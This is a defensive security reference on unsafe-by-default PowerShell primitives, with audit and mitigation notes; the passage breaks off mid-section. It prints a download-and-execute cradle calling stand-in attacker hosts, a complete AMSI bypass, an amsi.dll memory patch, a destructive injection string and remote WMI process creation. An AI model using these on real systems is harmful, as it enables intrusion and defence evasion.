# PowerShell Behavioral Footguns — Language Primitives That Are Unsafe by Default
## Synthesized from the Microsoft PowerShell team, the offensive-research canon (PowerSploit / Invoke-Obfuscation / AMSI bypass corpus), and the institutional advisories that catalog PowerShell-specific failure modes

> **Currency marker:** Last refreshed 2026-05-14. Part of the
> **language-specific behavioral footguns** class — cataloguing primitives
> whose *default behavior* in a specific language ecosystem is unsafe,
> distinct from cross-language bug-class docs that cover attack surface by
> class rather than by language. PowerShell occupies an unusual position
> in this taxonomy: simultaneously a sysadmin scripting language, a fully
> reflective .NET host, a remote management protocol, and the dominant
> post-exploitation lever on Windows endpoints. 2024-2026 load-bearing
> updates: the Truesec CLIXML deserialization writeup (2024) re-anchoring
> `Import-CliXml` as a deserialization sink reachable through ordinary
> administrative pipelines; continued cat-and-mouse around AMSI patching
> as Defender for Endpoint adds new signatures (`amsi.fail` catalogs the
> public bypass corpus); the 2023 Aqua "PowerHell" disclosures on
> PowerShell Gallery typosquatting and metadata spoofing; and the
> maturation of cross-platform PowerShell 7+ on Linux / macOS, which
> silently disables Windows-only `SecureString` DPAPI encryption.
>
> **Researchers:**
> - **Lee Holmes** — Lead Security Architect (Azure Management) at Microsoft;
>   original PowerShell team member; author of *PowerShell Cookbook*
>   (4th ed.); canonical author of "Defending Against PowerShell Attacks"
>   (PowerShell Team blog, DerbyCon 2017); source of the Microsoft statement
>   that "execution policy is not a security boundary"; co-author with Daniel
>   Bohannon of *Revoke-Obfuscation* (Black Hat USA 2017). Holmes' blog at
>   `leeholmes.com` is the load-bearing source for PowerShell-engine
>   security internals, AMSI integration design rationale, and the
>   ConstrainedLanguage / FullLanguage / NoLanguage mode taxonomy
> - **Bruce Payette** — Co-designer of the PowerShell language and principal
>   author of the language implementation; founding member of the PowerShell
>   team at Microsoft. Author of *Windows PowerShell in Action* (Manning, 3rd
>   ed. with Richard Siddaway), the canonical language reference. Payette's
>   design lineage — pipelines as object streams, type-coercion via
>   `[type]$value`, dynamic dispatch via `&` and `.`, scriptblock-as-first-
>   class-value — is the source of nearly every footgun in this document
> - **Matt Graeber** (`@mattifestation`) — original AMSI bypass disclosure (2016, the `[Ref].Assembly.GetType('...
>   AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,
>   $true)` technique); *Subverting Trust in Windows*
>   DerbyCon VII keynote on code-signing internals. Already cited in
>   `detection_engineering_expertise.md` and
>   `active_directory_windows_security.md` — cross-link rather than re-state
> - **Will Schroeder** (`@harmj0y`) — Technical architect at SpecterOps;
>   author of *PowerView* (the AD-enumeration toolkit dominating red-team
>   recon) and primary contributor to *PowerSploit* and *Empire*. Co-founder
>   of BloodHound. Already cited in `active_directory_windows_security.md`
> - **Daniel Bohannon** (`@danielhbohannon`) — Principal Threat Researcher
>   at Permiso Security (previously Microsoft, previously Mandiant). Author
>   of `Invoke-Obfuscation` (DerbyCon 2016), `Invoke-CradleCrafter`, and
>   *Revoke-Obfuscation*. Primary source for the canonical attacker chain
>   (encoded outer wrapper, string-eval inner) and the design rationale for
>   script-block logging (Event ID 4104) capturing the deobfuscated form
> - **Dmitry Sotnikov** — Long-running PowerShell MVP; built PowerGUI and
>   the first-generation Quest AD cmdlets; subsequently VP Cloud Platform at
>   42Crunch. `dmitrysotnikov.wordpress.com` is one of the longest-running
>   primary-source records of PowerShell community practice from v1/v2
>   through v5
> - **Microsoft Defender for Endpoint team** — Institutional; ships the AMSI
>   integration (`System.Management.Automation.dll` calls `AmsiScanBuffer`
>   on script-block compilation), the 4104 script-block-logging pipeline,
>   and the ConstrainedLanguage enforcement triggered by AppLocker / WDAC
> - **The Mandiant + Trail of Bits + Truesec PowerShell-incident corpus** —
>   Institutional. Truesec's 2024 *Attacking PowerShell CLIXML Deserialization*
>   is the load-bearing recent disclosure for the `Import-CliXml` surface
>
> **Institutional contributors:** MITRE ATT&CK (T1059.001), MITRE D3FEND,
> Microsoft Learn (`about_Execution_Policies`, `about_Language_Modes`,
> `about_Logging_Windows`), Microsoft Defender for Endpoint AMSI integration
> guide, NSA + CISA "Keeping PowerShell: Security Measures to Use and Embrace"
> (2022), and Aqua Security PowerHell research (2023).
>
> **What this doc is NOT:** not a PowerShell language tutorial, not a
> replacement for cross-language bug-class guidance, not a substitute for
> static analysis. It is the PowerShell-specific layer beneath cross-language
> audit heuristics.

Cross-links: `csharp_dotnet_footguns_expertise.md` (.NET surface PowerShell
inherits); `active_directory_windows_security.md` (Windows-attack-surface
parent); `detection_engineering_expertise.md` (Sigma + AMSI detection);
`deserialization_expertise.md`; `cicd_supply_chain_expertise.md` (cooldown
discipline); `code_review_expertise.md`; the [Semgrep rule-writing docs](https://semgrep.dev/docs/writing-rules/overview);
`dfir_methodology_expertise.md` (IR playbook).

---

## 1. The behavioral-footgun framing

### 1.1 PowerShell as "shell + .NET"

PowerShell's design unifies the Unix-style shell pipeline with the .NET
object model. Payette's *Windows PowerShell in Action* documents the
lineage: pipelines carry *objects*, not text; cmdlets are .NET classes;
every value has `.GetType()`; scriptblock values are invokable via
`.Invoke()`, captured in variables, and assemblable at runtime via
`[scriptblock]::Create($string)`.

The footgun lineage falls out of this design. Every primitive PowerShell
exposes is simultaneously a sysadmin convenience and an attacker
primitive. `Invoke-Expression $s` is convenience for dynamic dispatch;
also `eval` with full .NET reach. `Add-Type -TypeDefinition $s` is
convenience for un-cmdletted Win32 APIs; also a runtime C# compile-and-
load primitive. `[System.Reflection.Assembly]::Load($bytes)` is
convenience for in-process plugins; also a reflective-PE-load primitive
bypassing disk-based defenses.

The shell-half makes PowerShell ubiquitous (5.1 ships with every modern
Windows; uninstalling breaks core OS). The .NET-half means any payload
reaching a PowerShell interpreter has full reflective Windows reach
without dropping a separate binary.

(Cross-link: `csharp_dotnet_footguns_expertise.md` covers the .NET base.)

### 1.2 "Right tool for sysadmin" collides with "rich attack surface"

The team's stated intent (Holmes, Payette, Snover) was a language as
powerful as Perl / Python for Windows administration, replacing batch +
VBScript + WMIC. The language optimizes for terse dispatch of powerful
operations. The same terseness compresses attacker payloads. The
canonical download-cradle `IEX (New-Object
Net.WebClient).DownloadString('http://...')` is 60 characters and runs
arbitrary remote PowerShell with no disk write. The Graeber 2016 AMSI
bypass is a single statement. The footgun is not "too powerful"; it is
"legitimate operator use is indistinguishable on the wire from attacker
use without script-block logging, AMSI, ConstrainedLanguage, or JEA
isolation."

### 1.3 The parser-will-let-you axiom

Every footgun here satisfies: **the PowerShell parser accepts the syntax
without warning, PSScriptAnalyzer does not flag it under default
settings, and the runtime executes it without complaint**.
`PSAvoidUsingInvokeExpression` is the only built-in warning for §2.1
and is always enabled (Warning severity).

### 1.4 Audit-cost asymmetry

The auditor reads `Invoke-Expression $cmd` and must ask: where did
`$cmd` come from? Is the path tainted? Does the script run in
`FullLanguage` or `ConstrainedLanguage`? Is AMSI integrated? Is
script-block logging enabled? PowerShell scripts are typically authored
by sysadmins who do not run PSScriptAnalyzer in CI and may not
version-control the artifacts. (Cross-link: `code_review_expertise.md`
on click-count severity. PowerShell footguns frequently rank zero-click
on the remoting surface — `Invoke-Command -ComputerName $target
-ScriptBlock $sb` with a domain-admin token executes on any reachable
WinRM host with no user interaction.)

---

## 2. `Invoke-Expression` and string-eval primitives

### 2.1 `Invoke-Expression $userInput`

The canonical PowerShell injection sink. `Invoke-Expression` (alias `iex`)
takes a string and evaluates it as PowerShell. Microsoft's documentation
is explicit:

> "When using `Invoke-Expression` to run a command that the user enters,
> verify that the command is safe to run before running it. In general, it
> is best to design your script with predefined input options, rather than
> allowing freeform input."

Never use:
```powershell
$cmd = "Get-Process -Name $userName"
Invoke-Expression $cmd    # injection if $userName contains '; Remove-Item -Recurse C:\'
```

Safe rewrite — use parameter binding:
```powershell
Get-Process -Name $userName
```

Any non-trivial PowerShell codebase will contain at least one
`Invoke-Expression` call. The auditor should grep for `iex` and
`Invoke-Expression` as the first pass; every hit is a candidate sink.

### 2.2 The `iex` alias and attacker brevity

PowerShell ships `iex` as a built-in alias for `Invoke-Expression`.
Attackers prefer `iex` because it is shorter and historically missed by
string-match defenses scanning only for `Invoke-Expression`. Detection
must enumerate both forms. The canonical download-cradle (cataloged in
Bohannon's `Invoke-Obfuscation` and `Invoke-CradleCrafter`):

```
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
```

### 2.3 `& $command` and `. $script` — invocation and dot-source operators

PowerShell exposes two invocation operators that look like syntax noise
but are full code-execution primitives:

- `& $cmd` — the *call operator*. Invokes whatever `$cmd` resolves to:
  cmdlet name, external executable, scriptblock, `.ps1` path, function.
- `. $script` — the *dot-source operator*. Executes `$script` (a path to
  a `.ps1`) *in the current scope*, polluting it with the script's
  variables and functions.

Both look like punctuation; the auditor must know the operator-dispatch
semantics to recognize them as `eval`-class primitives. The call operator
is *safer* than `Invoke-Expression` (does not parse the string as
PowerShell) but still resolves `$cmd` against the command lookup table.

### 2.4 `[scriptblock]::Create($userString).Invoke()`

The reflection back-door for string-to-code conversion. Identical in
effect to `Invoke-Expression $userInput`:

```powershell
[scriptblock]::Create($userInput).Invoke()
```

ConstrainedLanguage blocks `[scriptblock]::Create($string)`. Auditors
who grep only for `Invoke-Expression` miss this pattern.

### 2.5 `Add-Type -TypeDefinition $userCode`

PowerShell's runtime C# compilation primitive. `Add-Type` accepts a
string of C# (or VB.NET / JScript on legacy hosts), invokes Roslyn /
CodeDOM, and loads the resulting assembly into the current AppDomain.
With user-controlled `$userCode`, generic arbitrary-C#-execution.
Attackers use this for: (1) **P/Invoke gateway** — small C# wrapper
around `OpenProcess`, `VirtualAlloc`, `WriteProcessMemory`,
`CreateRemoteThread` (canonical structure of process-injection scripts
in PowerSploit / Empire / Covenant); (2) **AMSI bypass / hooking** —
C# that patches `AmsiUtils`, replaces the scan delegate, or unhooks
Defender's ETW provider.

PSScriptAnalyzer has no default rule for `Add-Type -TypeDefinition` with
a non-literal string. Grep explicitly.

### 2.6 The canonical obfuscated-payload-to-IEX chain

Bohannon's *Invoke-Obfuscation* corpus catalogs the canonical chain: (1)
outer wrapper `powershell.exe -EncodedCommand <base64>`; (2) decoded
base64 produces a script that decompresses gzip, decodes inner base64,
decrypts an XOR-keyed string, or concatenates character-code arithmetic;
(3) deobfuscated string flows into `Invoke-Expression`,
`[scriptblock]::Create`, or `iex`.

Obfuscation defeats command-line string-match detection *before*
PowerShell starts; once running with script-block logging enabled, the
deobfuscated form is captured in Event ID 4104 (§11). Detection: any
string decoding (base64, gzip, XOR, char-code math) to a string
containing `iex`, `Invoke-Expression`, `& $`, or `[scriptblock]::Create`
is high-fidelity attacker indication.

---

## 3. Execution policy bypass

### 3.1 `Set-ExecutionPolicy` levels

Per `about_Execution_Policies`: **Restricted** (no scripts);
**AllSigned** (only Authenticode-signed, local+remote);
**RemoteSigned** (local unsigned; remote must be signed; default on
Windows Server); **Unrestricted** (all run, prompts for unsigned
remote); **Bypass** (nothing blocked). Naming suggests a security
boundary; naming is misleading.

### 3.2 ExecutionPolicy is NOT a security boundary

Microsoft's documentation:

> "The execution policy isn't a security boundary, it's defense in depth.
> For example, users can easily bypass a policy by typing the
> script contents at the command line when they can't run a script.
> Instead, the execution policy helps users to set basic rules and
> prevents them from violating them unintentionally."

Every level above `Bypass` can be defeated via at least four documented
mechanisms: (1) run content interactively (policy applies to script
*files*, not interactive input); (2) `-Command "<script>"` accepts a
string; (3) `-EncodedCommand <base64>` base64-encoded; (4)
`-ExecutionPolicy Bypass` single flag overriding for the invocation.

ExecutionPolicy is a configuration nudge, not enforcement. The only
durable PowerShell-level boundary resisting deliberate attack is
**ConstrainedLanguage Mode under WDAC** (§4).

### 3.3 The `IEX (New-Object Net.WebClient).DownloadString(...)` cradle

The canonical download-and-execute payload, in every post-2016
PowerShell-threat-actor writeup:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.example.com/p.ps1')
```

`New-Object Net.WebClient` — `System.Net.WebClient` from .NET BCL.
`.DownloadString('http://...')` — HTTP GET, returns body as `[string]`,
no disk write. `IEX (...)` — wraps in `Invoke-Expression`. Variants:
`DownloadFile`, `Invoke-WebRequest`, `Invoke-RestMethod`,
`[System.Net.Http.HttpClient]`, `Start-BitsTransfer` — equivalent
surfaces. MITRE ATT&CK T1059.001 catalogs threat-actor groups using
this primitive.

### 3.4 Real-world attacker corpus

The PowerShell + IEX + download-cradle pattern underpins most commodity
Windows malware loaders from 2015 onward: Emotet (2017-2021 and post-
takedown re-emergence), IcedID, the long tail of "fake update" /
browser-update social-engineering campaigns delivering a one-liner via
clipboard hijack, and the standard post-exploitation cradles in Cobalt
Strike's `powershell-command` beacon, Sliver, Brute Ratel, Mythic.

Defensive baseline (cross-link `dfir_methodology_expertise.md`):
script-block logging enabled, AMSI integration verified,
ConstrainedLanguage under WDAC for high-value endpoints, JEA for
admin-tier hosts.

---

## 4. Constrained Language Mode and AMSI

### 4.1 `$ExecutionContext.SessionState.LanguageMode`

PowerShell exposes a session property,
`$ExecutionContext.SessionState.LanguageMode`, with four values
(`about_Language_Modes`):

- **`FullLanguage`** — default. Full .NET method calls, type casts,
  scriptblock creation, `Add-Type`, reflection. What the interactive
  prompt and most admin scripts use.
- **`ConstrainedLanguage`** — restricts dangerous primitives: `Add-Type`,
  most .NET method calls, COM instantiation, scriptblock creation from
  strings, most reflection. PowerShell auto-runs ConstrainedLanguage when
  AppLocker or WDAC is enforcing.
- **`RestrictedLanguage`** — even more restrictive; primarily for module
  manifests.
- **`NoLanguage`** — used by JEA session configurations to restrict
  sessions to command invocations only.

The crucial mode for attackers is `FullLanguage`; the crucial mode for
defenders is `ConstrainedLanguage` because it removes the .NET reflection
surface that makes PowerShell a generic-loader platform.

### 4.2 ConstrainedLanguage restricts dangerous primitives

ConstrainedLanguage's restriction list (per Holmes' devblogs post):

- `Add-Type` blocked (no runtime C# compile).
- `New-Object` on COM objects blocked except for an approved allowlist.
- .NET method calls blocked except on a "safe types" allowlist (BCL
  primitives: `[string]`, `[int]`, `[hashtable]`, `[array]`, etc.).
- `[scriptblock]::Create($string)` blocked.
- `Invoke-Expression` allowed *but* the evaluated string also executes
  under ConstrainedLanguage — so `iex` cannot escape.
- `[type]::GetMethod($private, $flags).Invoke(...)` reflection blocked.

The cmdlet surface is unrestricted; sysadmin scripts using `Get-Process`,
`Set-Service`, `Get-CimInstance`, `Test-Connection` continue to work.
The .NET escape hatches are closed.

### 4.3 AMSI — runtime script-content inspection

The Antimalware Scan Interface (AMSI) is a Microsoft-defined COM interface
that lets antivirus engines inspect script content *at runtime, after
deobfuscation, before execution*. PowerShell is AMSI-integrated:
`System.Management.Automation.dll` calls `AmsiScanBuffer` on each
script-block compilation, passing the deobfuscated text. On
`AMSI_RESULT_DETECTED`, PowerShell refuses to execute and logs.

Holmes described AMSI in *Defending Against PowerShell Attacks* as the
only runtime mechanism that sees the *actual* attacker payload rather
than the obfuscated wrapper.

### 4.4 AMSI bypass corpus

Because AMSI sits between parser and execution, defeating AMSI requires
running PowerShell code — itself subject to AMSI inspection. Bypass
techniques: (1) patch `amsi.dll` in memory before the next scan call;
(2) flip `amsiInitFailed` on `System.Management.Automation.AmsiUtils`
via reflection (Graeber 2016, the "fits-in-a-tweet" bypass); (3) hook
`AmsiScanBuffer` via inline prologue patching; (4) unload the AMSI
provider via COM unregistration; (5) downgrade to PowerShell v2
(predates AMSI). `amsi.fail` catalogs working bypasses; Defender ships
signatures for each. The bypass corpus has been a continuous
cat-and-mouse since 2016.

### 4.5 The "patch amsi.dll in memory" canonical bypass

Structural shape (Rasta Mouse's `AmsiScanBufferBypass` and successors):

```powershell
$kernel32 = [Win32]::GetModuleHandle('amsi.dll')
$asb      = [Win32]::GetProcAddress($kernel32, 'AmsiScanBuffer')
[Win32]::VirtualProtect($asb, 6, 0x40, [ref]$old)
[Marshal]::Copy([byte[]]@(0xB8,0x57,0x00,0x07,0x80,0xC3), 0, $asb, 6)
```

Requires `Add-Type` (to define P/Invoke wrappers), which requires
`FullLanguage` mode. ConstrainedLanguage under WDAC blocks `Add-Type`,
blocking the whole class at the language level.

### 4.6 WDAC as enforcement layer

Windows Defender Application Control (WDAC, formerly Device Guard)
enforces ConstrainedLanguage at the OS layer. In `enforce` mode, the
PowerShell engine reads policy at session start and switches to
ConstrainedLanguage automatically. Attackers reaching a WDAC-enforced
host cannot use `Add-Type`, restricted-COM `New-Object`, or
reflection-based AMSI bypass.

WDAC's deployment cost is high — every legitimate binary must be
allowlisted. The NSA + CISA joint advisory "Keeping PowerShell" (2022)
recommends Constrained PowerShell with Application Control alongside
AMSI, logging, and remoting protections, and advises configuring
PowerShell rather than removing it.

(Cross-link: `detection_engineering_expertise.md` §4 covers Sigma rules
for AMSI-bypass detection.)

---

## 5. Deserialization via XML / JSON / CLIXML

### 5.1 `Import-CliXml -Path $userPath`

PowerShell's native serialization format is **CLIXML** (Common Language
Infrastructure XML), exposed through `Export-CliXml` and `Import-CliXml`.
CLIXML preserves type information; `Import-CliXml` deserializes back
into typed .NET objects, sharing the surface with `BinaryFormatter` and
the rest of the .NET deserialization family (cross-link
`csharp_dotnet_footguns_expertise.md` §6).

The Truesec 2024 *Attacking PowerShell CLIXML Deserialization* writeup
documents attacker-controlled CLIXML reaching code execution through
rehydrated breakpoint script blocks, `ScriptProperty` getters in default
type definitions, and type converters (e.g. PSFramework's
`BinaryFormatter`-wrapping converter). Exchange ProxyNotShell referenced CLIXML
deserialization as a load-bearing gadget.

Treat `Import-CliXml -Path $userPath` like `BinaryFormatter.Deserialize(stream)`.
Never call on attacker-influenced content. If `$userPath` resolves to a
user-writable directory, the call is a deserialization sink.

### 5.2 `[xml]$userInput` cast — XmlDocument parsing

`[xml]$string` invokes `System.Xml.XmlDocument` and parses the string as
XML. *Not* a cast — it constructs a new object via the type's parsing
constructor. .NET Framework versions before 4.5.2 enabled XXE by default
for `XmlDocument` and `XmlTextReader`; 4.5.2+ made both safe by default
(`XmlReader` was already safe), but supplying a non-null `XmlResolver`
reintroduces external-entity resolution.

The footgun: the auditor sees `[xml]$body` as a cast. Actual semantics
are XML parsing with deserialization-class side effects, including
potential XXE on legacy .NET hosts. Conservative pattern: use
`[System.Xml.Linq.XDocument]::Parse` (stricter defaults) or explicit
`XmlReaderSettings`.

### 5.3 `ConvertFrom-Json` — generally safer, type-coercion driven

`ConvertFrom-Json` deserializes JSON into `[PSCustomObject]`. Not
type-aware — JSON does not encode .NET type info, so the result is a
generic property bag rather than arbitrary-type instantiation. Much
safer than `Import-CliXml` or `BinaryFormatter`.

Residual footgun: *property-coercion*. PowerShell's parameter binding
coerces `[PSCustomObject]` to a typed parameter if property names match,
producing surprising binding when a user-controlled JSON property
collides with a cmdlet parameter name. Bug class is closer to
mass-assignment (`csharp_dotnet_footguns_expertise.md` §8) than RCE.

### 5.4 `PSSerializer.Deserialize` — CLIXML round-trip

`[PSSerializer]::Deserialize($xml)` is identical in surface to
`Import-CliXml` but operates on an in-memory XML string. Same
deserialization considerations.

### 5.5 `BinaryFormatter` via `Add-Type`

`Add-Type` can pull
`System.Runtime.Serialization.Formatters.Binary.BinaryFormatter` from
the BCL on .NET Framework hosts:

```powershell
Add-Type -AssemblyName System.Runtime.Serialization
$bf = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
$obj = $bf.Deserialize($stream)    # arbitrary-type instantiation
```

Inherits the full .NET deserialization-gadget catalog (cross-link
`csharp_dotnet_footguns_expertise.md` §6 and
`deserialization_expertise.md`). .NET 9 removed the `BinaryFormatter` implementation;
PowerShell 7+ on .NET 9+ throws `PlatformNotSupportedException`.
PowerShell 5.1 on .NET Framework 4.x retains the legacy surface
indefinitely.

---

## 6. COM / WMI / WSMan instantiation

### 6.1 `New-Object -ComObject $userControlled`

`New-Object -ComObject` takes a ProgID (or CLSID via `[guid]`) and
instantiates via `CoCreateInstance`. With user-controlled ProgID,
generic COM-class-load. Default Windows ships thousands of registered
classes; several have command-execution methods:
`Shell.Application.ShellExecute($exe, $args, ...)`,
`WScript.Shell.Exec($cmd)`, `Excel.Application` / `Word.Application`
(VBA dispatch), `MSXML2.ServerXMLHTTP` (HTTP requests outside the
PowerShell .NET surface, sometimes used to bypass detection rules
watching only `HttpClient` / `WebClient`).

Attackers use `New-Object -ComObject` precisely because it routes through
a different code path than `Process.Start` / `HttpClient`.
ConstrainedLanguage restricts `New-Object -ComObject` to a small
allowlist.

### 6.2 `Get-WmiObject -Class $userClass`

WMI is the Windows-native query interface for system state.
`Get-WmiObject` (legacy) and `Get-CimInstance` (modern, WS-Management
compliant) accept a class name and return instances. With user-controlled
`$userClass`, arbitrary WMI-namespace enumeration: `Win32_Process` for
listing, `Win32_StartupCommand` for persistence enumeration,
`Win32_UserAccount` for AD recon, `Win32_Service` for service-control
mapping.

### 6.3 `Invoke-WmiMethod` and `Win32_Process.Create`

Canonical attacker invocation:

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create `
                 -ArgumentList 'cmd.exe /c calc.exe' `
                 -ComputerName remote-host -Credential $cred
```

Invokes `Win32_Process.Create` on `remote-host` as `$cred`, creating a
new process. Classic WMI lateral-movement primitive, cataloged in
Cybereason's *Expanding the WMI Lateral Movement Arsenal*. ATT&CK T1047.

Mitigation: constrain WinRM / WMI to known admin tiers
(`active_directory_windows_security.md`), prefer `Invoke-CimMethod` (easier
to log via WS-Management events), gate WMI process-creation through
Defender for Endpoint or Sysmon (Event ID 1, parent `wmiprvse.exe`).

### 6.4 `Get-CimInstance` (newer; CIM)

The CIM cmdlets are WS-Management-compliant successors. Attack surface
identical (same classes, methods, `Win32_Process.Create` primitive); the
transport is WSMan over HTTP/HTTPS instead of DCOM. Detection rules
should cover both.

### 6.5 `Enter-PSSession` and `Invoke-Command -ComputerName`

PowerShell remoting via WinRM. `Enter-PSSession -ComputerName $target`
is interactive; `Invoke-Command -ComputerName $target -ScriptBlock {...}`
is non-interactive. Both use WinRM (TCP/5985 HTTP, 5986 HTTPS). WinRM
is enabled by default on Windows Server 2012+; client SKUs require
explicit enable. Authentication is Kerberos (falling back to NTLM), with
optional CredSSP that exposes plaintext credentials to the remote host
(cross-link `active_directory_windows_security.md` for CredSSP
credential-theft analysis).

Any user with `Local Administrator` on a WinRM-enabled host can execute
arbitrary PowerShell. Domain admins implicitly have this on every
domain-joined host with WinRM. Mitigation: **Just Enough Administration
(JEA)** — a session-config mechanism constraining the cmdlet surface
to a per-role allowlist (§14).

### 6.6 Lateral-movement primitive corpus

Full PowerShell lateral-movement primitives (cross-link
`active_directory_windows_security.md` §7):

1. `Invoke-Command -ComputerName` (WinRM)
2. `Enter-PSSession -ComputerName` (WinRM interactive)
3. `Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName` (WMI / DCOM)
4. `Invoke-CimMethod ... -CimSession ...` (WSMan)
5. `New-PSSession ... -UseSSL` then `Invoke-Command -Session` (persistent WinRM)
6. `New-Service -ComputerName` then `Start-Service` (legacy SCM)
7. `Copy-Item -ToSession` for staging payloads inside a WinRM session
8. `Register-ScheduledTask -CimSession` for scheduled-task persistence

All eight have legitimate sysadmin uses; all eight produce identical
attacker primitives.

---

## 7. Reflection and dynamic .NET access

### 7.1 `[System.Reflection.Assembly]::Load($bytes)`

The reflective-PE-load primitive. `Assembly.Load` accepts a byte array
containing a .NET PE image and loads it into the current AppDomain
without writing to disk. The loaded assembly's types become reachable
via `[YourLoadedType]::Method`. Canonical pattern: embed base64
payload, decode to bytes,
`[Reflection.Assembly]::Load($bytes)`, invoke an entry method.

No disk artifact. Defender's AMSI integration scans the byte array on
`Load` (.NET AMSI surface added in .NET Framework 4.8); the bypass corpus targets the AMSI scan *before* `Load`.
ConstrainedLanguage blocks `[Reflection.Assembly]::Load`; WDAC's
"Dynamic Code Security" feature additionally blocks in-memory
assemblies not matching the allowlist.

### 7.2 `[System.Reflection.Assembly]::LoadFile($path)`

Disk-based equivalent. Same surface; assembly bytes touch disk,
producing file-system telemetry `Load(byte[])` does not. Attackers
prefer `Load(byte[])` for stealth.

### 7.3 `[System.Reflection.MethodInfo]::Invoke`

Call any method on any object via reflection. Combined with
`GetType().GetMethod($name, $bindingFlags)`, reaches private and
internal methods. The Graeber AMSI bypass uses exactly this surface:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
    GetField('amsiInitFailed', 'NonPublic,Static').
    SetValue($null, $true)
```

Single statement disables AMSI for the rest of the session (field
checked once per scan; `$true` short-circuits subsequent scans).
ConstrainedLanguage blocks reflection on non-approved types,
neutralizing this technique.

### 7.4 `[System.Runtime.InteropServices.Marshal]`

Native-interop reach. `Marshal` exposes managed/unmanaged memory
conversion: `AllocHGlobal`, `Copy`, `PtrToStringAuto`, `WriteByte`,
`GetDelegateForFunctionPointer`. Combined with P/Invoke (via `Add-Type`
or `[DllImport]`), sufficient for shellcode injection, in-process
function hooking, arbitrary memory read/write. Attackers use `Marshal`
for shellcode loaders and AMSI hooks. ConstrainedLanguage blocks
`Marshal`.

### 7.5 `[Activator]::CreateInstance`

```powershell
$type = [Type]::GetType('Namespace.ClassName, AssemblyName')
$instance = [Activator]::CreateInstance($type, $constructorArgs)
```

"Instantiate any type by name." With user-controlled `$name`,
arbitrary-type instantiation. Overlaps `BinaryFormatter` and other
type-aware deserialization gadgets — same downstream effect
(side-effecting constructor or setter), different syntactic shape.

### 7.6 The "Invoke-ReflectivePEInjection" primitive

PowerSploit's `Invoke-ReflectivePEInjection.ps1` demonstrates how
`Marshal` + reflection compose into generic
in-memory-execution: take a PE byte array, allocate executable memory
in the current or remote process, map PE sections, fix up relocations
and imports, invoke the entry point — replicating the Windows loader's
logic in PowerShell. Heavily AV-signatured, but the *technique* is
open-ended; new variants ship routinely.

---

## 8. Module and script loading

### 8.1 `Import-Module $userPath`

`Import-Module` accepts a name (resolved against `$PSModulePath`) or a
path (`.psm1`, `.psd1`, `.dll`, `.ps1`). Parses the manifest, loads
exported commands, executes `OnRemove` / `Initialize` script blocks.
With user-controlled `$userPath`, arbitrary code execution via the
module-loading hook: malicious code can run in top-level `.psm1` body,
in auto-exporting functions, in `ScriptsToProcess`, in `NestedModules`
loaded transitively, in `RequiredModules` resolved against
`$PSModulePath`.

### 8.2 `$PSModulePath` — environment-variable-controlled search path

Default on Windows:

```
C:\Users\<user>\Documents\PowerShell\Modules;
C:\Program Files\PowerShell\Modules;
C:\Windows\system32\WindowsPowerShell\v1.0\Modules
```

Plus paths added by `$env:PSModulePath`. The *user-scoped* directory is
writable by the user without elevation; any attacker with user-context
code execution can drop a malicious module, and any subsequent
`Import-Module <name>` call resolving in that directory loads the
attacker's module.

Persistence variant: create a module named identically to a
commonly-imported one (`Microsoft.PowerShell.Utility`, `PSReadLine`) in
the user-scoped path. PowerShell's path-order resolution loads the
user-scoped version first, hijacking subsequent sessions.

### 8.3 `.psm1` / `.psd1` — module formats

**Script modules (`.psm1`)** — a script with `.psm1` extension; functions
auto-export unless `Export-ModuleMember` restricts. The entire body runs
at import — primary code-execution hook. **Module manifests (`.psd1`)** —
a hashtable literal of metadata: version, author, exported commands,
`ScriptsToProcess`, `NestedModules`, `RequiredModules`, `RootModule`.
`Import-Module` evaluates the manifest hashtable, executing embedded
expressions. `ScriptsToProcess` lists scripts that run *before* the
module loads — a pre-import code-execution hook. The `.psd1` format is
"data only" in spirit but implemented as a parsed PowerShell hashtable.

### 8.4 Manifest-only modules vs script modules

A **manifest-only module** has a `.psd1` listing `NestedModules` or
`RootModule` but no first-party `.psm1`. `NestedModules = @('foo.psm1',
'bar.dll')` produces load behavior with two distinct code-execution
hooks. Attacker variant: a manifest pointing at a benign-looking `.psm1`
but listing a malicious `.dll` in `NestedModules` — the manifest looks
innocuous on quick review.

### 8.5 PowerShell Gallery as supply-chain surface

The PowerShell Gallery (`powershellgallery.com`) is Microsoft's public
registry. `Install-Module` / `Install-Script` and the modern
PSResourceGet (`Install-PSResource`) pull from the Gallery by default.
Aqua "PowerHell" research (2023) catalogued three weaknesses:
**typosquatting** (no built-in protection against names visually
resembling popular modules — Aqua published `Az.Table` mimicking
`AzTable`);
**metadata spoofing** (arbitrary `Author`, `Description`, `Copyright`
fields; an attacker can publish claiming Microsoft
authorship without verification); **unlisted-module enumeration** (API
endpoint exposed withdrawn modules, sometimes containing secrets the
original publisher intended to remove).

Any script running `Install-Module <name>` without pinned version +
integrity check is exposed to upstream compromise.

(Cross-link: `cicd_supply_chain_expertise.md` §5 covers cooldown
discipline. PowerShell Gallery does not support per-package release-age
gates analogous to npm's `min-release-age` or uv's `exclude-newer`.
Defensive pattern for high-trust environments: mirror the Gallery into a
private feed with explicit pinning and review gates.)

### 8.6 Module Auto-Loading and `$PSModulePath` manipulation

PowerShell 3.0+ enables module auto-loading: typing an unresolved command
name triggers a `$PSModulePath` search and auto-imports any module
exporting that name. Convenience feature; persistence vector. An attacker
modifying `$PSModulePath` (env var, registry, or profile script) prepends
a malicious directory; any command typed afterward resolving there
triggers auto-import. Defensive pattern: verify `$PSModulePath` at
session start; disable auto-loading via
`$PSModuleAutoLoadingPreference = 'None'` in high-trust sessions.

---

## 9. Pipeline and parameter binding

### 9.1 Positional vs named parameters — silent re-binding

Cmdlets support named (`-Path C:\foo`) and positional (`C:\foo` in
`-Path` position). The cmdlet author declares positions explicitly.
Callers passing positional arguments bind by declared order; if the
author changes parameter order in a future version, every positional
caller silently re-binds. Stability trap, but in security-relevant
cmdlets (`Set-Acl`, `New-Item`, `Set-ItemProperty`), a positional
re-bind can produce ACL or registry changes against the wrong target.

### 9.2 `[Parameter(ValueFromPipeline)]`

The auditor reading a function signature must check which parameters
bind from pipeline objects vs command-line arguments. A pipeline-bound
`[string]$Path` accepts any upstream pipeline object whose `.ToString()`
or property-name-match resolves to a string. Attackers controlling
